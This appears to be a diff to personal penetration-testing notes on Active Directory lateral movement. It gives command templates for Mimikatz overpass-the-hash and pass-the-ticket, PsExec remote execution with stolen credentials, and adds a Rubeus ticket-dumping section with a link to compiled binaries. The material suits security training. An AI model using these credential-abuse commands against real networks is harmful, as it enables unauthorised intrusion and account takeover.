@@ -75,7 +75,7 @@ Enter-PSSession {PSSession_ID_returned}
 - This can act as `RunAs` but for a domain user's hash 
 - Performed using Mimikatz
 	- `sekurlsa::pth /user:{domain_user} /domain:{domain} /ntlm:{compromised_hash} /run:powershell`
-- To get a Kerberos ticket, we run something in the new powershell window as jen
+- To get a Kerberos ticket, we run something in the new powershell window 
 	- `net use \\files04`
 - Once we have the ticket, we can just use PsExec to run commands on the remote systems using the compromised user
 	- `PsExec.exe \\{dnshostname} powershell`
@@ -90,6 +90,10 @@ Enter-PSSession {PSSession_ID_returned}
 	- We can then pick the desired ticket by passing the ticket name
 		- `kerberos::ptt {ticket_name}`
 	- If using these to access file shares, running something like `ls \\web04\` will just give an error. Type `ls \\web04\` and press tab (or just `Find-DomainShare` with PowerView)
+- **Rubeus**
+  - [Compiled binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+  - Dumping and using tickets is one of Rubeus's strong suits
+  - `Rubeus.exe triage` to list available tickets
 
 **Abusing Domain Trusts**
 - Golden ticket
